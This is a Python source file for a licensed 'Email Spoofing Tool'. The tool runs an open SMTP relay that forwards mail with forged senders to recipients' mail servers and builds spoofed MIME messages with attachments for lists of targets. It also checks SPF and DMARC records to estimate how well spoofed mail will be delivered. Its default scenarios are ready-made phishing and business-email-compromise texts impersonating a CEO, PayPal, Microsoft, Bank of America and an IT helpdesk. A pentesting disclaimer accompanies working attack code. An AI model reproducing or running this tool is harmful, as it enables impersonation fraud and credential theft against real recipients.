#!/usr/bin/env python3
"""
EST - Email Spoofing Tool
Professional Email Security Assessment Framework

Author: paris
Version: 3.1.0
License: Proprietary (License Key Required)
Repository: https://github.com/LOBEG/ESET

LEGAL NOTICE:
This tool is designed for authorized security testing, penetration testing,
and educational purposes only. Users must obtain explicit written permission
before testing any systems they do not own. Unauthorized use of this tool
may violate local, state, and federal laws.

The developers assume no liability and are not responsible for any misuse
or damage caused by this program.
"""

import sys
import os
import json
import argparse
import socket
import threading
import smtplib
import time
import subprocess
import signal
import mimetypes
import hashlib
import uuid
import base64
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Optional, Tuple
import logging
from dataclasses import dataclass, field
import re
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.application import MIMEApplication
from email import encoders
from email.header import Header
from email.utils import formatdate
import email.utils

# Version and metadata
__version__ = "3.1.0"
__author__ = "paris"
__license__ = "Proprietary"
__description__ = "Professional Email Security Assessment Framework"

# License configuration – only the owner can generate valid keys
_LICENSE_MASTER_SECRET = "EST-PARIS-MASTER-KEY-2024-SECURE"


# ======================================================================
# License Management System
# ======================================================================

class LicenseManager:
    """Manages license validation for EST.

    License keys are HMAC-SHA256 based tokens tied to a machine fingerprint.
    Only the owner (who knows _LICENSE_MASTER_SECRET) can generate valid keys
    using the ``est license generate`` command.
    """

    LICENSE_FILE_NAME = "license.key"

    def __init__(self, config_dir: Optional[Path] = None):
        self.config_dir = config_dir or (Path.home() / ".est")
        self.config_dir.mkdir(exist_ok=True)
        self.license_file = self.config_dir / self.LICENSE_FILE_NAME

    # ------------------------------------------------------------------
    # Machine fingerprint
    # ------------------------------------------------------------------

    @staticmethod
    def _get_machine_id() -> str:
        """Return a stable machine identifier."""
        parts: List[str] = []

        # /etc/machine-id (Linux)
        mid_path = Path("/etc/machine-id")
        if mid_path.exists():
            parts.append(mid_path.read_text().strip())

        # Hostname
        parts.append(socket.gethostname())

        # MAC address fallback
        parts.append(str(uuid.getnode()))

        combined = "|".join(parts)
        return hashlib.sha256(combined.encode()).hexdigest()[:32]

    # ------------------------------------------------------------------
    # Key generation (owner-only)
    # ------------------------------------------------------------------

    @staticmethod
    def generate_license_key(machine_id: Optional[str] = None,
                             days_valid: int = 365,
                             tier: str = "pro") -> str:
        """Generate a license key.  Only the owner can call this because
        the master secret is embedded in the source.

        Key format: ``BASE64( JSON({machine_id, expires, tier, sig}) )``
        """
        if machine_id is None:
            machine_id = LicenseManager._get_machine_id()

        expires = (datetime.now(tz=None) + timedelta(days=days_valid)).isoformat()

        payload = {
            "machine_id": machine_id,
            "expires": expires,
            "tier": tier,
            "version": __version__,
        }

        sig_input = f"{machine_id}|{expires}|{tier}|{_LICENSE_MASTER_SECRET}"
        payload["sig"] = hashlib.sha256(sig_input.encode()).hexdigest()

        raw_json = json.dumps(payload, separators=(",", ":"))
        return base64.urlsafe_b64encode(raw_json.encode()).decode()

    # ------------------------------------------------------------------
    # Validation
    # ------------------------------------------------------------------

    def validate_license(self, key: Optional[str] = None) -> Dict:
        """Validate a license key and return status dict.

        Checks: signature, machine binding, expiration date.
        """
        result: Dict = {
            "valid": False,
            "tier": None,
            "expires": None,
            "machine_match": False,
            "error": None,
        }

        if key is None:
            key = self._load_stored_key()
            if key is None:
                result["error"] = "No license key found. Use 'est license activate <key>' to activate."
                return result

        try:
            raw = base64.urlsafe_b64decode(key.encode())
            payload = json.loads(raw)
        except Exception:
            result["error"] = "Malformed license key"
            return result

        required = {"machine_id", "expires", "tier", "sig"}
        if not required.issubset(payload.keys()):
            result["error"] = "Incomplete license key"
            return result

        # Signature check
        sig_input = (
            f"{payload['machine_id']}|{payload['expires']}|"
            f"{payload['tier']}|{_LICENSE_MASTER_SECRET}"
        )
        expected_sig = hashlib.sha256(sig_input.encode()).hexdigest()
        if payload["sig"] != expected_sig:
            result["error"] = "Invalid license key (signature mismatch)"
            return result

        # Machine binding
        current_machine = self._get_machine_id()
        result["machine_match"] = payload["machine_id"] == current_machine
        if not result["machine_match"]:
            result["error"] = "License key is bound to a different machine"
            return result

        # Expiration
        try:
            expires_dt = datetime.fromisoformat(payload["expires"])
        except Exception:
            result["error"] = "Invalid expiration date in key"
            return result

        result["expires"] = payload["expires"]
        result["tier"] = payload["tier"]

        if datetime.now(tz=None) > expires_dt:
            result["error"] = f"License expired on {payload['expires']}"
            return result

        result["valid"] = True
        return result

    # ------------------------------------------------------------------
    # Storage
    # ------------------------------------------------------------------

    def activate_license(self, key: str) -> Dict:
        """Validate and store a license key."""
        status = self.validate_license(key)
        if status["valid"]:
            self.license_file.write_text(key.strip())
            status["message"] = f"License activated successfully (tier={status['tier']}, expires={status['expires']})"
        return status

    def deactivate_license(self) -> bool:
        """Remove stored license."""
        if self.license_file.exists():
            self.license_file.unlink()
            return True
        return False

    def _load_stored_key(self) -> Optional[str]:
        if self.license_file.exists():
            return self.license_file.read_text().strip()
        return None

    def get_status(self) -> Dict:
        """Return current license status (for display)."""
        key = self._load_stored_key()
        if key is None:
            return {"active": False, "error": "No license key installed"}
        status = self.validate_license(key)
        status["active"] = status["valid"]
        return status

    def print_status(self):
        """Pretty-print current license status."""
        st = self.get_status()
        print("\n🔑 EST License Status")
        print("─" * 40)
        if st.get("valid") or st.get("active"):
            print(f"   ✅ Status:  ACTIVE")
            print(f"   🏷️  Tier:    {st.get('tier', 'unknown').upper()}")
            print(f"   📅 Expires: {st.get('expires', 'N/A')}")
            print(f"   🖥️  Machine: Bound to this device")
        else:
            print(f"   ❌ Status:  INACTIVE")
            print(f"   ⚠️  Reason:  {st.get('error', 'Unknown')}")
        print()

    def require_license(self) -> bool:
        """Enforce license before running any tool command.

        Returns True if license is valid, False otherwise (also prints
        a user-friendly message).
        """
        st = self.validate_license()
        if st["valid"]:
            return True

        print("\n🔒 EST License Required")
        print("─" * 40)
        print(f"   {st.get('error', 'License validation failed')}")
        print()
        print("   To activate a license:")
        print("     est license activate <YOUR-LICENSE-KEY>")
        print()
        print("   To obtain a license, contact the EST author.")
        print()
        return False


# ======================================================================
# Data classes
# ======================================================================

@dataclass
class EmailScenario:
    """Data class for email spoofing scenarios"""
    name: str
    category: str
    from_email: str
    from_name: str
    subject: str
    body: str
    description: str
    severity: str

@dataclass
class TestResult:
    """Data class for test results"""
    timestamp: str
    test_type: str
    scenario: str
    target: str
    from_email: str
    success: bool
    details: Dict


class DNSValidator:
    """Validates DNS records (SPF, DKIM, DMARC) for sender domains to improve deliverability"""

    def __init__(self, logger: Optional[logging.Logger] = None):
        self.logger = logger or logging.getLogger('EST.DNS')
        self._dns_available = False
        try:
            import dns.resolver
            self._dns_available = True
        except ImportError:
            self.logger.warning("dnspython not installed; DNS validation will be limited")

    def validate_sender_domain(self, sender_email: str) -> Dict:
        """Run full DNS validation for a sender email domain.
        Returns a dict with spf, dkim, dmarc status and warnings."""
        domain = sender_email.split('@')[-1] if '@' in sender_email else sender_email
        results: Dict = {
            "domain": domain,
            "spf": {"found": False, "record": None, "pass": False},
            "dmarc": {"found": False, "record": None, "policy": None},
            "mx": {"found": False, "servers": []},
            "warnings": [],
            "deliverability": "unknown"
        }

        if not self._dns_available:
            results["warnings"].append("dnspython not installed – cannot validate DNS records")
            return results

        import dns.resolver

        # --- SPF check ---
        try:
            txt_records = dns.resolver.resolve(domain, 'TXT')
            for rdata in txt_records:
                txt = rdata.to_text().strip('"')
                if txt.startswith('v=spf1'):
                    results["spf"]["found"] = True
                    results["spf"]["record"] = txt
                    # A strict SPF with -all or ~all may reject spoofed mail
                    if '-all' in txt:
                        results["spf"]["pass"] = False
                        results["warnings"].append(
                            f"SPF hard-fail (-all) on {domain}: spoofed mail will likely be rejected"
                        )
                    elif '~all' in txt:
                        results["spf"]["pass"] = False
                        results["warnings"].append(
                            f"SPF soft-fail (~all) on {domain}: spoofed mail may land in spam"
                        )
                    elif '?all' in txt or '+all' in txt or 'all' not in txt:
                        results["spf"]["pass"] = True
                    break
        except Exception as e:
            self.logger.debug(f"SPF lookup failed for {domain}: {e}")

        # --- DMARC check ---
        try:
            dmarc_domain = f"_dmarc.{domain}"
            dmarc_records = dns.resolver.resolve(dmarc_domain, 'TXT')
            for rdata in dmarc_records:
                txt = rdata.to_text().strip('"')
                if txt.startswith('v=DMARC1'):
                    results["dmarc"]["found"] = True
                    results["dmarc"]["record"] = txt
                    # Extract policy
                    policy_match = re.search(r'p=(\w+)', txt)
                    if policy_match:
                        policy = policy_match.group(1).lower()
                        results["dmarc"]["policy"] = policy
                        if policy == 'reject':
                            results["warnings"].append(
                                f"DMARC policy=reject on {domain}: spoofed mail will be rejected"
                            )
                        elif policy == 'quarantine':
                            results["warnings"].append(
                                f"DMARC policy=quarantine on {domain}: spoofed mail will land in spam"
                            )
                    break
        except Exception as e:
            self.logger.debug(f"DMARC lookup failed for {domain}: {e}")

        # --- MX check ---
        try:
            mx_records = dns.resolver.resolve(domain, 'MX')
            servers = [str(mx.exchange).rstrip('.') for mx in sorted(mx_records, key=lambda x: x.preference)]
            results["mx"]["found"] = bool(servers)
            results["mx"]["servers"] = servers
        except Exception as e:
            self.logger.debug(f"MX lookup failed for {domain}: {e}")

        # --- Deliverability assessment ---
        has_strict_spf = results["spf"]["found"] and not results["spf"]["pass"]
        has_strict_dmarc = results["dmarc"]["found"] and results["dmarc"]["policy"] in ('reject', 'quarantine')

        if has_strict_spf and has_strict_dmarc:
            results["deliverability"] = "low"
        elif has_strict_spf or has_strict_dmarc:
            results["deliverability"] = "medium"
        elif results["spf"]["found"] or results["dmarc"]["found"]:
            results["deliverability"] = "medium-high"
        else:
            results["deliverability"] = "high"

        return results

    def print_validation_report(self, results: Dict):
        """Pretty-print DNS validation results to console"""
        domain = results["domain"]
        print(f"\n🔍 DNS Validation Report for: {domain}")
        print("─" * 50)

        # SPF
        if results["spf"]["found"]:
            print(f"   📋 SPF: Found – {results['spf']['record']}")
        else:
            print(f"   📋 SPF: Not found (good for spoofing deliverability)")

        # DMARC
        if results["dmarc"]["found"]:
            policy = results["dmarc"]["policy"] or "none"
            print(f"   🛡️  DMARC: Found – policy={policy}")
        else:
            print(f"   🛡️  DMARC: Not found (good for spoofing deliverability)")

        # MX
        if results["mx"]["found"]:
            print(f"   📡 MX Servers: {', '.join(results['mx']['servers'][:3])}")
        else:
            print(f"   📡 MX Servers: Not found")

        # Deliverability
        deliv = results["deliverability"]
        deliv_icons = {"high": "🟢", "medium-high": "🟡", "medium": "🟠", "low": "🔴", "unknown": "⚪"}
        print(f"   {deliv_icons.get(deliv, '⚪')} Deliverability: {deliv.upper()}")

        # Warnings
        if results["warnings"]:
            print(f"\n   ⚠️  Warnings:")
            for w in results["warnings"]:
                print(f"      • {w}")
        print()

class ESTConfig:
    """Configuration manager for EST"""
    
    def __init__(self):
        self.config_dir = Path.home() / ".est"
        self.config_file = self.config_dir / "config.json"
        self.log_file = self.config_dir / "est_tests.log"
        self.reports_dir = self.config_dir / "reports"
        self.templates_dir = self.config_dir / "templates"
        
        # Create directories
        self.config_dir.mkdir(exist_ok=True)
        self.reports_dir.mkdir(exist_ok=True)
        self.templates_dir.mkdir(exist_ok=True)
        
        # Load configuration
        self.config = self._load_config()
        
        # Setup logging
        self._setup_logging()
    
    def _load_config(self) -> Dict:
        """Load configuration from file"""
        default_config = {
            "version": __version__,
            "smtp_server": {
                "host": "0.0.0.0",
                "port": 2525,
                "timeout": 30
            },
            "scenarios": [
                {
                    "name": "CEO Fraud - Urgent Wire Transfer",
                    "category": "Business Email Compromise",
                    "from_email": "ceo@targetcompany.com",
                    "from_name": "John Smith, CEO",
                    "subject": "URGENT: Wire Transfer Authorization Required",
                    "body": "I need you to process an urgent wire transfer for $85,000 to our new vendor immediately. This is time-sensitive and confidential. Please handle this discreetly and confirm once completed.\n\nAmount: $85,000\nAccount details will be provided separately.\n\nRegards,\nJohn Smith\nChief Executive Officer",
                    "description": "CEO impersonation requesting urgent financial transaction",
                    "severity": "Critical"
                },
                {
                    "name": "IT Helpdesk - Password Reset",
                    "category": "Technical Support Fraud",
                    "from_email": "helpdesk@targetcompany.com",
                    "from_name": "IT Support Team",
                    "subject": "Action Required: Password Reset Verification",
                    "body": "Dear User,\n\nWe have detected suspicious activity on your account. For security purposes, you must verify your current password within 24 hours to prevent account suspension.\n\nClick here to verify: [VERIFICATION LINK]\n\nFailure to verify will result in immediate account lockout.\n\nIT Support Team\nDo not reply to this email.",
                    "description": "IT support impersonation for credential harvesting",
                    "severity": "High"
                },
                {
                    "name": "PayPal Security Alert",
                    "category": "Financial Services Phishing",
                    "from_email": "security@paypal.com",
                    "from_name": "PayPal Security Team",
                    "subject": "Security Alert: Unusual Account Activity Detected",
                    "body": "We've detected unusual activity on your PayPal account:\n\n• Login from new device (IP: 192.168.1.100)\n• Attempted transaction: $1,247.99\n• Location: Unknown\n\nYour account has been temporarily limited for your protection.\n\nVerify your account immediately: [SECURE LINK]\n\nIf you don't recognize this activity, please contact us immediately.\n\nPayPal Security Team\nThis is an automated message.",
                    "description": "PayPal impersonation for account compromise",
                    "severity": "High"
                },
                {
                    "name": "Microsoft 365 License Expiration",
                    "category": "Software/License Fraud",
                    "from_email": "noreply@microsoft.com",
                    "from_name": "Microsoft 365 Admin",
                    "subject": "ACTION REQUIRED: Your Microsoft 365 License Expires Today",
                    "body": "Your Microsoft 365 Business license expires today at 11:59 PM.\n\nImmediate action required to prevent:\n✗ Loss of email access\n✗ File synchronization stoppage\n✗ Team collaboration disruption\n\nRenew immediately to maintain access:\n[RENEWAL LINK]\n\nYour license key: M365-BIZ-2024-XXXX\n\nMicrosoft 365 Administration\nThis is an automated renewal notice.",
                    "description": "Microsoft service impersonation for credential theft",
                    "severity": "Medium"
                },
                {
                    "name": "Bank Account Verification",
                    "category": "Financial Institution Fraud",
                    "from_email": "security@bankofamerica.com",
                    "from_name": "Bank of America Security",
                    "subject": "Immediate Verification Required - Account Suspension Notice",
                    "body": "IMPORTANT SECURITY NOTICE\n\nWe have temporarily suspended your account due to suspicious activity:\n\n• Multiple failed login attempts\n• Unrecognized device access\n• Potential unauthorized transactions\n\nAccount Status: SUSPENDED\nSuspension Date: [TODAY]\nReference: SEC-2024-[RANDOM]\n\nVerify your identity immediately to restore access:\n[VERIFICATION PORTAL]\n\nFailure to verify within 48 hours will result in permanent closure.\n\nBank of America Security Department",
                    "description": "Banking institution impersonation for credential harvesting",
                    "severity": "Critical"
                }
            ],
            "temp_email_services": [
                "guerrillamail.com",
                "sharklasers.com", 
                "mailinator.com",
                "10minutemail.com",
                "tempmail.org",
                "yopmail.com"
            ],
            "reporting": {
                "auto_generate": True,
                "format": "json",
                "include_screenshots": False
            }
        }
        
        if self.config_file.exists():
            try:
                with open(self.config_file, 'r') as f:
                    loaded_config = json.load(f)
                # Merge with defaults to ensure all keys exist
                for key in default_config:
                    if key not in loaded_config:
                        loaded_config[key] = default_config[key]
                return loaded_config
            except Exception as e:
                print(f"⚠️  Error loading config: {e}")
                return default_config
        else:
            self._save_config(default_config)
            return default_config
    
    def _save_config(self, config: Dict):
        """Save configuration to file"""
        try:
            with open(self.config_file, 'w') as f:
                json.dump(config, f, indent=2)
        except Exception as e:
            print(f"⚠️  Error saving config: {e}")
    
    def _setup_logging(self):
        """Setup logging configuration"""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(self.log_file),
                logging.StreamHandler(sys.stdout)
            ]
        )
        self.logger = logging.getLogger('EST')

class SMTPTestServer:
    """Professional SMTP server for security testing"""
    
    def __init__(self, host: str, port: int, config: ESTConfig):
        self.host = host
        self.port = port
        self.config = config
        self.running = False
        self.connections = 0
        self.emails_processed = 0
        
    def start(self):
        """Start the SMTP testing server"""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock.bind((self.host, self.port))
            self.sock.listen(10)
            self.running = True
            
            print(f"""
╔══════════════════════════════════════════════════════════════╗
║                    EST SMTP SERVER v{__version__}                    ║
║              Email Spoofing Tool - Server Mode               ║
╚══════════════════════════════════════════════════════════════╝

🚀 Server Status: ACTIVE
📡 Listening on: {self.host}:{self.port}
📁 Log file: {self.config.log_file}
📊 Statistics: {self.connections} connections, {self.emails_processed} emails processed

⚡ Server Features:
   • Multi-threaded connection handling
   • Automatic MX record resolution
   • Real-time email relay to destinations
   • Comprehensive audit logging
   • Professional SMTP protocol compliance

🎯 Quick Test Commands:
   telnet {self.host} {self.port}
   est test 1 target@example.com
   
🛑 Press Ctrl+C to stop server
            """)
            
            # Handle Ctrl+C gracefully
            signal.signal(signal.SIGINT, self._signal_handler)
            
            while self.running:
                try:
                    client_sock, addr = self.sock.accept()
                    self.connections += 1
                    thread = threading.Thread(
                        target=self._handle_client, 
                        args=(client_sock, addr),
                        name=f"SMTP-Client-{self.connections}"
                    )
                    thread.daemon = True
                    thread.start()
                except Exception as e:
                    if self.running:
                        self.config.logger.error(f"Accept error: {e}")
                        
        except Exception as e:
            print(f"❌ Server startup failed: {e}")
            if self.port <= 1024:
                print("💡 Try using a higher port number (e.g., --port 2525)")
        finally:
            if hasattr(self, 'sock'):
                self.sock.close()
    
    def _signal_handler(self, signum, frame):
        """Handle shutdown signals"""
        print(f"\n\n🛑 Shutting down EST SMTP Server...")
        print(f"📊 Final Statistics:")
        print(f"   • Connections handled: {self.connections}")
        print(f"   • Emails processed: {self.emails_processed}")
        print(f"   • Log file: {self.config.log_file}")
        self.running = False
        sys.exit(0)
    
    def _handle_client(self, client_sock, addr):
        """Handle individual SMTP client connections"""
        client_id = f"{addr[0]}:{addr[1]}"
        
        try:
            self.config.logger.info(f"New SMTP connection from {client_id}")
            
            # SMTP session state
            mail_from = ""
            rcpt_to = []
            
            # Send greeting
            client_sock.send(f"220 EST-SMTP-{__version__} Security Testing Server Ready\r\n".encode())
            
            while self.running:
                try:
                    data = client_sock.recv(4096).decode('utf-8', errors='ignore').strip()
                    if not data:
                        break
                    
                    # Log command
                    self.config.logger.debug(f"[{client_id}] Command: {data}")
                    
                    cmd = data.upper()
                    
                    if cmd.startswith("EHLO") or cmd.startswith("HELO"):
                        response = f"250-EST-SMTP Hello {addr[0]}\r\n250 HELP\r\n"
                        client_sock.send(response.encode())
                        
                    elif cmd.startswith("MAIL FROM:"):
                        mail_from = self._extract_email(data)
                        self.config.logger.info(f"[{client_id}] Spoofed sender: {mail_from}")
                        client_sock.send(b"250 OK\r\n")
                        
                    elif cmd.startswith("RCPT TO:"):
                        rcpt = self._extract_email(data)
                        rcpt_to.append(rcpt)
                        self.config.logger.info(f"[{client_id}] Target: {rcpt}")
                        client_sock.send(b"250 OK\r\n")
                        
                    elif cmd == "DATA":
                        client_sock.send(b"354 End data with <CR><LF>.<CR><LF>\r\n")
                        
                        # Receive email data
                        email_data = ""
                        while True:
                            line = client_sock.recv(4096).decode('utf-8', errors='ignore')
                            email_data += line
                            if line.endswith('\r\n.\r\n'):
                                break
                        
                        # Process email
                        success = self._process_email(mail_from, rcpt_to, email_data[:-5], client_id)
                        self.emails_processed += 1
                        
                        if success:
                            client_sock.send(b"250 OK Message queued for delivery\r\n")
                        else:
                            client_sock.send(b"550 Message delivery failed\r\n")
                        
                        # Reset session
                        mail_from = ""
                        rcpt_to = []
                        
                    elif cmd == "QUIT":
                        client_sock.send(b"221 EST-SMTP closing connection\r\n")
                        break
                        
                    elif cmd.startswith("RSET"):
                        mail_from = ""
                        rcpt_to = []
                        client_sock.send(b"250 OK\r\n")
                        
                    else:
                        client_sock.send(b"500 Command not recognized\r\n")
                        
                except socket.timeout:
                    break
                except Exception as e:
                    self.config.logger.error(f"[{client_id}] Command processing error: {e}")
                    break
                    
        except Exception as e:
            self.config.logger.error(f"[{client_id}] Connection error: {e}")
        finally:
            client_sock.close()
            self.config.logger.info(f"[{client_id}] Connection closed")
    
    def _extract_email(self, smtp_line: str) -> str:
        """Extract email address from SMTP command"""
        match = re.search(r'<(.+?)>', smtp_line)
        if match:
            return match.group(1)
        parts = smtp_line.split()
        return parts[-1].strip('<>') if len(parts) > 1 else ""
    
    def _process_email(self, mail_from: str, rcpt_to: List[str], email_data: str, client_id: str) -> bool:
        """Process and relay spoofed email"""
        self.config.logger.info(f"[{client_id}] Processing spoofed email from {mail_from} to {rcpt_to}")
        
        success_count = 0
        for rcpt in rcpt_to:
            if self._relay_email(mail_from, rcpt, email_data):
                success_count += 1
        
        # Log test result
        result = TestResult(
            timestamp=datetime.now().isoformat(),
            test_type="smtp_relay",
            scenario="server_relay",
            target=", ".join(rcpt_to),
            from_email=mail_from,
            success=success_count > 0,
            details={
                "client_id": client_id,
                "total_targets": len(rcpt_to),
                "successful_deliveries": success_count,
                "email_size": len(email_data)
            }
        )
        
        self._log_test_result(result)
        
        return success_count > 0
    
    def _relay_email(self, mail_from: str, rcpt_to: str, email_data: str) -> bool:
        """Relay email to destination"""
        try:
            domain = rcpt_to.split('@')[1]
            mx_servers = self._get_mx_servers(domain)
            
            self.config.logger.info(f"Attempting relay to {rcpt_to} via {len(mx_servers)} MX servers")
            
            for mx_server in mx_servers:
                try:
                    server = smtplib.SMTP(mx_server, 25, timeout=15)
                    server.set_debuglevel(0)
                    
                    # Ensure proper encoding
                    full_email = f"From: {mail_from}\r\nTo: {rcpt_to}\r\n{email_data}"
                    full_email_bytes = full_email.encode('utf-8')
                    server.sendmail(mail_from, [rcpt_to], full_email_bytes)
                    server.quit()
                    
                    self.config.logger.info(f"✅ Email delivered to {rcpt_to} via {mx_server}")
                    return True
                    
                except Exception as e:
                    self.config.logger.warning(f"❌ Relay failed via {mx_server}: {str(e)[:60]}...")
                    continue
            
            self.config.logger.error(f"❌ All relay attempts failed for {rcpt_to}")
            return False
            
        except Exception as e:
            self.config.logger.error(f"❌ Relay error for {rcpt_to}: {e}")
            return False
    
    def _get_mx_servers(self, domain: str) -> List[str]:
        """Get MX servers for domain"""
        try:
            import dns.resolver
            mx_records = dns.resolver.resolve(domain, 'MX')
            servers = [str(mx.exchange).rstrip('.') for mx in sorted(mx_records, key=lambda x: x.preference)]
            self.config.logger.debug(f"Found MX servers for {domain}: {servers}")
            return servers
        except ImportError:
            self.config.logger.warning("DNS library not available, using fallbacks")
        except Exception as e:
            self.config.logger.warning(f"DNS lookup failed for {domain}: {e}")
        
        # Fallback servers
        fallbacks = [f"mail.{domain}", f"mx.{domain}", f"mx1.{domain}"]
        working_fallbacks = []
        
        for mx in fallbacks:
            try:
                socket.gethostbyname(mx)
                working_fallbacks.append(mx)
            except Exception:
                continue
        
        return working_fallbacks
    
    def _log_test_result(self, result: TestResult):
        """Log test result to file"""
        try:
            log_entry = {
                "timestamp": result.timestamp,
                "test_type": result.test_type,
                "scenario": result.scenario,
                "target": result.target,
                "from_email": result.from_email,
                "success": result.success,
                "details": result.details
            }
            
            with open(self.config.log_file, 'a') as f:
                f.write(json.dumps(log_entry) + '\n')
                
        except Exception as e:
            self.config.logger.error(f"Failed to log test result: {e}")

class EST:
    """Main EST application class"""
    
    def __init__(self):
        self.config = ESTConfig()
        self.scenarios = [EmailScenario(**s) for s in self.config.config['scenarios']]
        self.dns_validator = DNSValidator(self.config.logger)
        self.license_mgr = LicenseManager(self.config.config_dir)
    
    def print_banner(self):
        """Print professional banner"""
        banner = f"""
╔══════════════════════════════════════════════════════════════╗
║                    EST - Email Spoofing Tool                 ║
║              Professional Security Assessment v{__version__}         ║
║                                                              ║
║    Advanced Email Security Testing Framework                 ║
║    For Authorized Penetration Testing Only                   ║
║    Educational & Research Purposes                           ║
║                                                              ║
║  Author: {__author__:<52s}║
║  License: {__license__:<51s}║
╚══════════════════════════════════════════════════════════════╝

⚠️  LEGAL NOTICE: This tool is for authorized security testing only.
   Obtain explicit written permission before testing any systems.
   Unauthorized use may violate applicable laws and regulations.
        """
        print(banner)
    
    def list_scenarios(self):
        """List all available test scenarios"""
        print("\n📋 Available Email Spoofing Scenarios:\n")
        
        categories = {}
        for i, scenario in enumerate(self.scenarios, 1):
            if scenario.category not in categories:
                categories[scenario.category] = []
            categories[scenario.category].append((i, scenario))
        
        for category, scenarios in categories.items():
            print(f"🏷️  {category}")
            print("─" * (len(category) + 5))
            
            for idx, scenario in scenarios:
                severity_icon = {
                    "Critical": "🔴",
                    "High": "🟠", 
                    "Medium": "🟡",
                    "Low": "🟢"
                }.get(scenario.severity, "⚪")
                
                print(f"   {idx:2d}. {scenario.name} {severity_icon}")
                print(f"       From: {scenario.from_name} <{scenario.from_email}>")
                print(f"       Subject: {scenario.subject}")
                print(f"       Description: {scenario.description}")
                print()
        
        print(f"📊 Total scenarios: {len(self.scenarios)}")
        print(f"🎯 Use 'est test <id> <target>' to run a scenario")

    # ------------------------------------------------------------------
    # Unified email builder
    # ------------------------------------------------------------------

    def _build_email_message(
        self,
        from_email: str,
        from_name: str,
        to_email: str,
        subject: str,
        body: str,
        html_body: Optional[str] = None,
        attachments: Optional[List[str]] = None,
        reply_to: Optional[str] = None,
        in_reply_to: Optional[str] = None,
        references: Optional[str] = None,
        scenario: Optional[EmailScenario] = None,
    ) -> str:
        """Build a fully-featured MIME email message.

        Supports plain text, HTML body, file attachments (PDF, HTML, etc.),
        Reply-To header, and threading headers (In-Reply-To, References).
        """
        has_attachments = attachments and len(attachments) > 0

        # Root message type depends on whether we have attachments
        if has_attachments:
            msg = MIMEMultipart('mixed')
        else:
            msg = MIMEMultipart('alternative')

        # Standard headers
        msg['From'] = f"{from_name} <{from_email}>"
        msg['To'] = to_email
        msg['Subject'] = Header(subject, 'utf-8')
        msg['Date'] = formatdate(localtime=True)
        sender_domain = from_email.split('@')[1] if '@' in from_email else 'localhost'
        msg['Message-ID'] = email.utils.make_msgid(domain=sender_domain)
        msg['X-Mailer'] = f"EST/{__version__}"

        # Reply-To header
        if reply_to:
            msg['Reply-To'] = reply_to

        # Threading headers
        if in_reply_to:
            msg['In-Reply-To'] = in_reply_to
        if references:
            msg['References'] = references

        # Build disclaimer
        if scenario:
            disclaimer = (
                f"\n────────────────────────────────────────────────────────────────\n"
                f"This email was sent using EST (Email Spoofing Tool) for authorized\n"
                f"security testing purposes. If you received this email unexpectedly,\n"
                f"please contact your IT security team immediately.\n\n"
                f"Test Details:\n"
                f"• Scenario: {scenario.name}\n"
                f"• Category: {scenario.category}\n"
                f"• Severity: {scenario.severity}\n"
                f"• Timestamp: {datetime.now().isoformat()}\n\n"
                f"EST v{__version__} - Professional Email Security Assessment Framework\n"
                f"────────────────────────────────────────────────────────────────"
            )
        else:
            disclaimer = (
                f"\n────────────────────────────────────────────────────────────────\n"
                f"This email was sent using EST (Email Spoofing Tool) for authorized\n"
                f"security testing purposes. If you received this email unexpectedly,\n"
                f"please contact your IT security team immediately.\n\n"
                f"EST v{__version__} - Professional Email Security Assessment Framework\n"
                f"────────────────────────────────────────────────────────────────"
            )

        # Body parts (text + optional HTML)
        plain_text = body + disclaimer

        if has_attachments:
            # Wrap body inside a multipart/alternative sub-part
            body_part = MIMEMultipart('alternative')
            body_part.attach(MIMEText(plain_text, 'plain', 'utf-8'))
            if html_body:
                body_part.attach(MIMEText(html_body, 'html', 'utf-8'))
            msg.attach(body_part)
        else:
            msg.attach(MIMEText(plain_text, 'plain', 'utf-8'))
            if html_body:
                msg.attach(MIMEText(html_body, 'html', 'utf-8'))

        # Attachments
        if has_attachments:
            for filepath in attachments:
                self._attach_file(msg, filepath)

        return msg.as_string()

    def _attach_file(self, msg: MIMEMultipart, filepath: str):
        """Attach a file (PDF, HTML, or any supported type) to a MIME message."""
        path = Path(filepath)
        if not path.is_file():
            self.config.logger.warning(f"Attachment not found, skipping: {filepath}")
            return

        content_type, _ = mimetypes.guess_type(str(path))
        if content_type is None or '/' not in content_type:
            content_type = 'application/octet-stream'

        maintype, subtype = content_type.split('/', 1)

        with open(path, 'rb') as fp:
            file_data = fp.read()

        if maintype == 'text':
            attachment = MIMEText(file_data.decode('utf-8', errors='replace'), _subtype=subtype)
        elif maintype == 'application':
            attachment = MIMEApplication(file_data, _subtype=subtype)
        else:
            attachment = MIMEBase(maintype, subtype)
            attachment.set_payload(file_data)
            encoders.encode_base64(attachment)

        attachment.add_header(
            'Content-Disposition', 'attachment', filename=path.name
        )
        msg.attach(attachment)
        self.config.logger.info(f"📎 Attached: {path.name} ({content_type})")

    # ------------------------------------------------------------------
    # Sending helpers
    # ------------------------------------------------------------------

    def _resolve_targets(self, target: Optional[str] = None,
                         target_list: Optional[str] = None) -> List[str]:
        """Resolve a list of target email addresses from CLI args.

        Supports:
        - Single email via *target*
        - Comma-separated emails via *target*
        - A file path (one email per line) via *target_list*
        """
        targets: List[str] = []

        if target:
            # Support comma-separated targets
            for addr in target.split(','):
                addr = addr.strip()
                if addr and '@' in addr:
                    targets.append(addr)

        if target_list:
            tl_path = Path(target_list)
            if tl_path.is_file():
                with open(tl_path, 'r') as f:
                    for line in f:
                        addr = line.strip()
                        if addr and '@' in addr and not addr.startswith('#'):
                            targets.append(addr)
                self.config.logger.info(f"Loaded {len(targets)} targets from {target_list}")
            else:
                print(f"❌ Target list file not found: {target_list}")

        # Deduplicate while preserving order
        seen = set()
        unique: List[str] = []
        for t in targets:
            if t not in seen:
                seen.add(t)
                unique.append(t)
        return unique

    def _load_html_body(self, html_body: Optional[str] = None,
                        body_file: Optional[str] = None) -> Optional[str]:
        """Load HTML body content from a raw string or file."""
        if html_body:
            return html_body
        if body_file:
            bf_path = Path(body_file)
            if bf_path.is_file():
                with open(bf_path, 'r', encoding='utf-8') as f:
                    return f.read()
            else:
                print(f"⚠️  HTML body file not found: {body_file}")
        return None

